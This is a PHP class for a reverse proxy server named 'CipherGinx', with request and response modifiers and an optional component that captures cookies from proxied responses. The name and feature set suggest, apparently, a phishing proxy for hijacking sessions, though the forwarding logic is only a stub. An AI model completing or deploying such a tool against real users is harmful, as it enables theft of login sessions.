<?php

namespace CipherGinx;

use Workerman\Worker;
use Workerman\Connection\TcpConnection;
use Monolog\Logger;
use Monolog\Handlers\StreamHandler;

/**
 * Core Proxy Server
 * Handles incoming connections and routes them through the reverse proxy
 */
class ProxyServer
{
    private Worker $worker;
    private Logger $logger;
    private RequestModifier $requestModifier;
    private ResponseModifier $responseModifier;
    private CookieCapture $cookieCapture;
    private array $config;

    public function __construct(array $config)
    {
        $this->config = $config;
        $this->initializeLogger();
        $this->requestModifier = new RequestModifier($this->logger);
        $this->responseModifier = new ResponseModifier($this->logger);
        $this->cookieCapture = new CookieCapture($this->logger, $config);
        $this->initializeWorker();
    }

    /**
     * Initialize Monolog logger
     */
    private function initializeLogger(): void
    {
        $this->logger = new Logger('cipherginx');
        $this->logger->pushHandler(new StreamHandler(
            $this->config['log_file'] ?? './logs/cipherginx.log',
            $this->config['log_level'] ?? Logger::INFO
        ));
    }

    /**
     * Initialize Workerman Worker
     */
    private function initializeWorker(): void
    {
        $protocol = $this->config['proxy_ssl'] ? 'ssl' : 'tcp';
        $host = $this->config['proxy_host'] ?? 'localhost';
        $port = $this->config['proxy_port'] ?? 443;

        $this->worker = new Worker("{$protocol}://{$host}:{$port}");
        $this->worker->name = 'CipherGinx-Proxy';
        $this->worker->count = 4; // Number of worker processes

        // Set SSL context if SSL is enabled
        if ($this->config['proxy_ssl']) {
            $this->worker->transport = 'ssl';
            $context_option = [
                'ssl' => [
                    'local_cert' => $this->config['proxy_cert_path'],
                    'local_pk' => $this->config['proxy_key_path'] ?? $this->config['proxy_cert_path'],
                    'verify_peer' => false,
                ]
            ];
            $this->worker->context = stream_context_create($context_option);
        }

        // Handle incoming connections
        $this->worker->onConnect = [$this, 'handleConnect'];
        $this->worker->onMessage = [$this, 'handleMessage'];
        $this->worker->onClose = [$this, 'handleClose'];
        $this->worker->onError = [$this, 'handleError'];
    }

    /**
     * Handle new connection
     */
    public function handleConnect(TcpConnection $connection): void
    {
        $this->logger->info('New connection from ' . $connection->getRemoteIp());
    }

    /**
     * Handle incoming message (HTTP request)
     */
    public function handleMessage(TcpConnection $connection, $data): void
    {
        try {
            $this->logger->debug('Received data: ' . substr($data, 0, 100));

            // Parse HTTP request
            $request = $this->parseHttpRequest($data);

            // Modify request
            $modified_request = $this->requestModifier->modify($request, $this->config);

            // Forward to target host
            $response = $this->forwardRequest($modified_request);

            // Modify response
            $modified_response = $this->responseModifier->modify($response, $this->config);

            // Capture cookies if configured
            if ($this->config['capture_cookies']) {
                $this->cookieCapture->parse($modified_response);
            }

            // Send response back to client
            $connection->send($modified_response);

        } catch (\Exception $e) {
            $this->logger->error('Error handling message: ' . $e->getMessage());
            $connection->send("HTTP/1.1 500 Internal Server Error\r\n\r\n");
        }
    }

    /**
     * Handle connection close
     */
    public function handleClose(TcpConnection $connection): void
    {
        $this->logger->info('Connection closed from ' . $connection->getRemoteIp());
    }

    /**
     * Handle connection error
     */
    public function handleError(TcpConnection $connection, $code, $msg): void
    {
        $this->logger->error("Connection error [$code]: $msg");
    }

    /**
     * Parse incoming HTTP request
     */
    private function parseHttpRequest(string $data): array
    {
        $lines = explode("\r\n", $data);
        $request_line = array_shift($lines);
        [$method, $path, $version] = explode(' ', $request_line);

        $headers = [];
        $body = '';
        $body_started = false;

        foreach ($lines as $line) {
            if ($line === '' && !$body_started) {
                $body_started = true;
                continue;
            }
            if ($body_started) {
                $body .= $line . "\r\n";
            } else {
                [$key, $value] = explode(': ', $line, 2);
                $headers[$key] = $value;
            }
        }

        return [
            'method' => $method,
            'path' => $path,
            'version' => $version,
            'headers' => $headers,
            'body' => trim($body),
            'raw' => $data
        ];
    }

    /**
     * Forward request to target host
     */
    private function forwardRequest(array $request): string
    {
        // TODO: Implement using Guzzle HTTP Client
        // This is a placeholder for forwarding logic
        return "HTTP/1.1 200 OK\r\n\r\n";
    }

    /**
     * Start the proxy server
     */
    public function start(): void
    {
        $this->logger->info('CipherGinx Proxy Server starting...');
        Worker::runAll();
    }
}
